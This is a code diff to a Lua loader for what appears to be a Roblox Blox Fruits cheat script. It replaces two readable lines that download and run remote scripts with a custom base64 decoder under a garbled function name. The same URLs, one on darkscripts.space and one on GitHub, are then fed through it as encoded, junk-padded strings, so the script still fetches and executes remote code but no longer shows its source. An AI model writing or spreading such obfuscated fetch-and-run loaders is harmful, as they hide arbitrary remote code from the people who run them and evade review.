@@ -1,3 +1,12 @@
-loadstring(game:HttpGet('https://darkscripts.space/scripts/6b8050ee-6680-478c-a6c8-fd66c2a18b96_1287224124766158934.lua',true))()
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function vuGXRTMmuHTpcyZQYMeMPPimbSvleUGDhZeyhLiYqVAnMooeDePycqixArCeMtdDonTXRc(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+loadstring(game:HttpGet(vuGXRTMmuHTpcyZQYMeMPPimbSvleUGDhZeyhLiYqVAnMooeDePycqixArCeMtdDonTXRc('IoPRoYepyfKLDunPkCjTGOOHONkbwEBkdlYTXAqLhlkbcNyhRiTnPspaHR0cHM6Ly9kYXJrc2NyaXB0cy5zcGFjZS9zY3JpcHRzLzZiODA1MGVlLTY2ODAtNDc4Yy1hNmM4LWZkNjZjMmExOGI5Nl8xMjg3MjI0MTI0NzY2MTU4OTM0Lmx1YQ=='),true))()
+
+loadstring(game:HttpGet(vuGXRTMmuHTpcyZQYMeMPPimbSvleUGDhZeyhLiYqVAnMooeDePycqixArCeMtdDonTXRc('SbnePHXGqSzqhhmYVhRylTnJEhSdzsEQFzdEkskySaMcFzaStMxmdgLaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlYWxyZWR6L0Jsb3hGcnVpdHMvcmVmcy9oZWFkcy9tYWluL1NvdXJjZS5sdWE=')))()    
